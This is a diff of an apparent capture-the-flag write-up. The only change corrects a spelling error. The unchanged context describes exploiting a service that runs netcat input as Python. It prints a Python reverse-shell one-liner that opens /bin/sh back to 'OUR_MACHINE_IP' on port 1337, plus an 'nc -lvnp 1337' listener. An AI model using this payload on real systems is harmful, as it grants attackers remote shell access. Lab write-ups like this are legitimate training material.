@@ -24,7 +24,7 @@ We see that the http server is using the simplehttp python. the command to start
 
 So we connect using netcat a swiss army knife to handling basic network connections, we use the command
 `nc 10.201.65.80 8000` (i lost the screenshot but when you connect via netcat all you type in the terminal is run by a python interpreter, so if i typed `hello` it would return `NameError: name 'hello' is not defined.`
-and when typed `print("hello")` we receive *hello* as response. **Then we can conclute that this is the remote code execution flaw of the server, we can exploit this to execute arbitrary code into the server machine**.
+and when typed `print("hello")` we receive *hello* as response. **Then we can conclude that this is the remote code execution flaw of the server, we can exploit this to execute arbitrary code into the server machine**.
 
 We use a reverse shell cheat sheet online to look an one line python code to make the server spawn a shell and connects to our machine (REVERSE SHELL) writing `import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("OUR_MACHINE_IP",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")` into the netcat connection with the target as is running a get request as python code. This code will make the server connects to our machine and connect an interactive shell of the server into our machine by port 1337, so we set our machine to listen to connections in port 1337 by using `nc -lvnp 1337` (-l is listen, -v verbone, -p port and -n no dns resolution).
 
